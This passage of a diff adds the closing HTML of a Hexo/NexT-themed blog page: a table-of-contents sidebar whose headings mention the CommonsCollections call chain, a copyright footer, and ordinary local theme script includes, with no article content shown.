nav-level-2"><a class="nav-link" href="#0x02-CommonsCollections调用链过程"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 CommonsCollections调用链过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-小结"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 小结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">白仁</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
